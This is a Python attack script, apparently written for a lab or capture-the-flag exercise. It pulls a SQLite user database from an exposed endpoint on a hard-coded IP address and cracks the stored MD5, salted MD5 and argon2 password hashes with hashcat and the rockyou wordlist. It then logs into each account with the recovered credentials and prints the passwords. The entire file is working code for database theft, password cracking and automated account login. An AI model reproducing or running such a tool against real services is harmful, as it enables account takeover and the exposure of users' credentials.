import sys
import requests
import sqlite3
import subprocess
from passlib.hash import argon2


def download_database(port):
    file = open(f"{port}.db.sqlite3", "wb")
    get_data = requests.get(f"http://94.103.95.24:{port}/db")
    file.write(get_data.content)
    file.close()


def getTitleBlock(text,psswrd):
    try:
        start = str(text).split('<h1 class="title">')# + len(tag)
        wel = start[1].split('</h1>')[0]
        print(wel)
        print(f"Account password: {psswrd}")
        return wel
    except:
        print(0)
        return 0


def authenticationHTML(port,data):
    # print(data)
    url = "http://94.103.95.24:" + port + "/"
    req = requests.post(url + "login", data=data)
    text = req.text
    # print(text)
    res = getTitleBlock(text,data.get('password'))
    return res


def read_table():
    connection = sqlite3.connect(f"{sys.argv[1]}.db.sqlite3")
    cursor = connection.cursor()
    query = """SELECT * from user"""
    cursor.execute(query)
    records = cursor.fetchall()
    print("Count of accounts:", len(records))
    data = []
    for row in records:
        x = row[0], row[1], row[2], row[3]
        # print(x)
        data.append(x)
    cursor.close()
    connection.close()
    return data

def getReq(id:int,email:str,psswrd:str,name:str) -> dict:
    req = {
        "id": id,
        "email": email,
        "password": psswrd,
        "name": name
    }
    return req


#for Linux
def md5_crackLin(mode, hash,file):
    cmd = f"hashcat -a 0 -m {mode} --force {hash} {file}.txt" #+ " -o data.txt"
    subprocess.check_output(cmd, shell=True)
    show = f"hashcat -a 0 -m {mode} --force {hash} {file}.txt --show"# + " -o data.txt"
    returned_output = subprocess.check_output(show, shell=True)
    if mode == 0:
        return returned_output.decode("utf-8")[33:-1]
    else:
        return returned_output.decode("utf-8")[41:-1]


# For Windows
def md5_crackWin(mode, hash,file):
    cmd = f"hashcat -a 0 -m {mode} --force {hash} {file}1.txt" #+ " -o data.txt"
    subprocess.check_output(cmd, shell=True)
    show = f"hashcat -a 0 -m {mode} --force {hash} {file}1.txt --show"# + " -o data.txt"
    returned_output = subprocess.check_output(show, shell=True)
    if mode == 0:
        return returned_output.decode("utf-8")[33:-1]
    else:
        return returned_output.decode("utf-8")[41:-1]


def argon2_crack(hash,file):
    passwordList = open(f"{file}1.txt",'r').read().splitlines()
    for password in passwordList:
        passwordCheck = argon2.verify(password, hash)
        if(passwordCheck==True):
            return password
    return ""


def changePort(port):
    filename = "rockyou"
    if port == "5000":
        download_database(port)
        data = read_table()
        for i in range(0, len(data)):
            account = data[i]
            print(account)
            req = getReq(account[0], account[1], account[2], account[3])
            authenticationHTML(port, req)

    if port == "5001":
        download_database(port)
        data = read_table()
        for i in range(0, len(data)):
            account = data[i]
            req = getReq(account[0],account[1],account[2],account[3])
            authenticationHTML(port, req)

    if port == "5002":
        download_database(port)
        data = read_table()
        for i in range(0, len(data)):
            account = data[i]
            crack = md5_crackLin(0,account[2],filename)
            req = getReq(account[0],account[1],crack,account[3])
            authenticationHTML(port, req)
    
    if port == "5003":
        download_database(port)
        data = read_table()
        for i in range(0, len(data)):
            account = data[i]
            crack = md5_crackLin(10, account[2],filename)
            req = getReq(account[0], account[1], crack, account[3])
            authenticationHTML(port, req)

    if port == "5004":
        download_database(port)
        data = read_table()
        for i in range(0, len(data)):
            account = data[i]
            crack = argon2_crack(account[2],filename)
            req = getReq(account[0], account[1], crack, account[3])
            authenticationHTML(port, req)


if __name__ == "__main__":
    changePort(sys.argv[1])